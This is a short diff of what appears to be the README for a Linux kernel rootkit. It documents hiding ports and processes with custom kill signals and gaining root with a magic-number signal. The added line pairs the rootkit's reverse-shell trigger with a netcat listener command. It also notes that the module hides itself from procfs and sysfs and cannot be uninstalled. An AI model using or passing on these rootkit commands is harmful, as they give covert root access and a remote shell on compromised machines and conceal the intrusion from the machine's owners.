@@ -21,7 +21,7 @@
 <b>* Hide Ports:</b> kill -61 [port] toggles visibility. kill -61 0 unhides all ports.<br>
 <b>* Hide Processes:</b> kill -62 [pid] toggles visibility. kill -62 0 unhides all processes<br>
 <b>* Gain Root:</b> Kill -64 31337. Magic number is configurable in source code.<br>
-<b>* Reverse Shell:</b> ./trigger [ remote addr ] [ local addr ]
+<b>* Reverse Shell:</b> ./trigger [ remote addr ] [ local addr ] + local listener (nc -6 -lvnp 65000)
 
 Module starts out hidden from both procfs and sysfs. It can't be uninstalled. You must reboot.<br><br>
 
